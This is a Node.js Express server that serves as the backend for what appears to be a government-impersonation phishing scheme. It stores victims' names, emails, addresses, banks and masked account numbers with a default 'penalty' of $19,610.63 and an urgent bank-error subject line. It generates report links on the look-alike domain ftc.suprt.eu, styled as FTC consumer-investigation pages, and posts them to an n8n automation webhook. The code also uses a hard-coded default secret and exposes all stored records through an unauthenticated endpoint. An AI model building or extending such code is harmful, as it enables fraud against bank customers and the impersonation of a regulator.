/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());

// Path to reportData.json inside src/data
const dataFilePath = path.join(__dirname, 'src/data/reportData.json');

// Serve static assets from Vite build output directory (dist)
app.use(express.static(path.join(__dirname, 'dist')));

// API endpoint to generate report directly (persisted to disk at runtime)
app.post('/api/generate-report', (req, res) => {
  const securityCode = req.headers['x-security-code'] || req.body?.security_code;
  const configuredCode = process.env.SECURITY_CODE || 'secret123'; // Default fallback code

  if (securityCode !== configuredCode) {
    return res.status(401).json({ error: 'Unauthorized: Invalid security code' });
  }

  const {
    id,
    name,
    email,
    address,
    bank,
    accountEnding,
    accountMasked,
    amount,
    initialPenalty = '$19,610.63',
    subject,
    callbackUrl
  } = req.body || {};

  if (!name || !bank || !amount) {
    return res.status(400).json({ error: 'Missing required fields (name, bank, amount)' });
  }

  // Load current reports database
  let reportData = {};
  try {
    if (fs.existsSync(dataFilePath)) {
      reportData = JSON.parse(fs.readFileSync(dataFilePath, 'utf-8'));
    }
  } catch (err) {
    console.error('Error reading reports database:', err);
  }

  // Generate deterministic report details
  const recordId = Math.floor(10000000 + Math.random() * 90000000).toString();
  const bankSlug = bank
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/(^-|-$)/g, '');

  const generatedUrl = `https://ftc.suprt.eu/advice-and-guidance/report/${recordId}/${bankSlug}-consumer-investigation`;

  const newEntry = {
    id: id || null,
    recordId,
    name,
    email: email || null,
    address: address || null,
    bank,
    accountMasked: accountMasked || `XXXXXXXXX${accountEnding || ''}`,
    accountEnding: accountEnding || '',
    amount,
    initialPenalty,
    subject: subject || 'Urgent Resolution Required Error in transaction in your bank',
    reviewUrl: generatedUrl
  };

  reportData[recordId] = newEntry;

  // Persist directly to disk
  try {
    fs.writeFileSync(dataFilePath, JSON.stringify(reportData, null, 2));
    console.log(`✅ Saved new report entry directly to disk: ${recordId}`);
  } catch (err) {
    console.error('Failed to write to file:', err);
    return res.status(500).json({ error: 'Failed to persist report data' });
  }

  // Trigger callback asynchronously if provided
  if (callbackUrl) {
    const callbackToken = process.env.N8N_CALLBACK_TOKEN;
    const headers = { 'Content-Type': 'application/json' };
    if (callbackToken) {
      headers['Authorization'] = `Bearer ${callbackToken}`;
    }

    fetch(callbackUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify({
        id: id || null,
        recordId,
        url: generatedUrl,
        status: 'success'
      })
    })
    .then(r => console.log(`📬 Callback sent to n8n with status ${r.status}`))
    .catch(e => console.error('⚠️ Callback sending failed:', e.message));
  }

  return res.status(200).json({
    success: true,
    recordId,
    url: generatedUrl
  });
});

// Endpoint to fetch dynamic reports database at runtime
app.get('/api/reports', (req, res) => {
  try {
    if (fs.existsSync(dataFilePath)) {
      const reportData = JSON.parse(fs.readFileSync(dataFilePath, 'utf-8'));
      return res.json(reportData);
    }
    return res.json({});
  } catch (err) {
    console.error('Failed to read reports:', err);
    res.status(500).json({ error: 'Failed to read reports database' });
  }
});

// Serve index.html for all other frontend routes (Single Page Application fallback routing)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Production server running on port ${PORT}`);
  console.log(`🔒 Configured Security Code: ${process.env.SECURITY_CODE ? 'Set from environment' : 'Using default: "secret123"'}`);
});
